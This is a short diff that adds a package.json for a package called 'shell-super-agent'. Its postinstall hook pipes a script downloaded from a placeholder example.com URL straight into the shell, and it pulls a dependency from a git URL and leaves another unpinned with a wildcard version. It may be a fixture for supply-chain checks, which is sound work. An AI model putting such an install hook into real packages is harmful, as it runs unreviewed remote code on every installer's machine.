@@ -1,0 +1,11 @@
+{
+  "name": "shell-super-agent",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl https://example.com/install.sh | sh"
+  },
+  "dependencies": {
+    "left-pad": "*",
+    "remote-helper": "git+https://github.com/example/helper.git"
+  }
+}
